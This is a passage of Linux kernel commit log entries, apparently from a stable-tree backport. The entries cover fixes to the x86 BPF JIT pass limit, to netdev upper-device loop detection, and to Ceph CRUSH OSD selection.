Date:   Fri May 22 15:42:55 2015 -0700

    x86: bpf_jit: fix compilation of large bpf programs
    
    [ Upstream commit 3f7352bf21f8fd7ba3e2fcef9488756f188e12be ]
    
    x86 has variable length encoding. x86 JIT compiler is trying
    to pick the shortest encoding for given bpf instruction.
    While doing so the jump targets are changing, so JIT is doing
    multiple passes over the program. Typical program needs 3 passes.
    Some very short programs converge with 2 passes. Large programs
    may need 4 or 5. But specially crafted bpf programs may hit the
    pass limit and if the program converges on the last iteration
    the JIT compiler will be producing an image full of 'int 3' insns.
    Fix this corner case by doing final iteration over bpf program.
    
    Fixes: 0a14842f5a3c ("net: filter: Just In Time compiler for x86-64")
    Reported-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: Alexei Starovoitov <ast@plumgrid.com>
    Tested-by: Daniel Borkmann <daniel@iogearbox.net>
    Acked-by: Daniel Borkmann <daniel@iogearbox.net>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 516ec5eb66b0fc63862c487a04d401d3310bc085
Author: Vlad Yasevich <vyasevich@gmail.com>
Date:   Sat May 2 21:33:44 2015 -0400

    net: core: Correct an over-stringent device loop detection.
    
    [ Upstream commit d66bf7dd27573ee5ea90484899ee952c19ccb194 ]
    
    The code in __netdev_upper_dev_link() has an over-stringent
    loop detection logic that actually prevents valid configurations
    from working correctly.
    
    In particular, the logic returns an error if an upper device
    is already in the list of all upper devices for a given dev.
    This particular check seems to be a overzealous as it disallows
    perfectly valid configurations.  For example:
      # ip l a link eth0 name eth0.10 type vlan id 10
      # ip l a dev br0 typ bridge
      # ip l s eth0.10 master br0
      # ip l s eth0 master br0  <--- Will fail
    
    If you switch the last two commands (add eth0 first), then both
    will succeed.  If after that, you remove eth0 and try to re-add
    it, it will fail!
    
    It appears to be enough to simply check adj_list to keeps things
    safe.
    
    I've tried stacking multiple devices multiple times in all different
    combinations, and either rx_handler registration prevented the stacking
    of the device linking cought the error.
    
    Signed-off-by: Vladislav Yasevich <vyasevic@redhat.com>
    Acked-by: Jiri Pirko <jiri@resnulli.us>
    Acked-by: Veaceslav Falico <vfalico@gmail.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

commit 9e56322af5e016ca5dd73dbb5b0e43072a699194
Author: Ilya Dryomov <idryomov@gmail.com>
Date:   Tue Apr 14 16:04:23 2015 +0300

    crush: ensuring at most num-rep osds are selected
    
    commit 45002267e8d2699bf9b022315bee3dd13b044843 upstream.
    
    Crush temporary buffers are allocated as per replica size configured
    by the user.  When there are more final osds (to be selected as per
    rule) than the replicas, buffer overlaps and it causes crash.  Now, it
    ensures that at most num-rep osds are selected even if more number of
    osds are allowed by the rule.
    
    Reflects ceph.git commits 6b4d1aa99718e3b367496326c1e64551330fabc0,
                              234b066ba04976783d15ff2abc3e81b6cc06fb10.
    
    Signed-off-by: Ilya Dryomov <idryomov@gmail.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
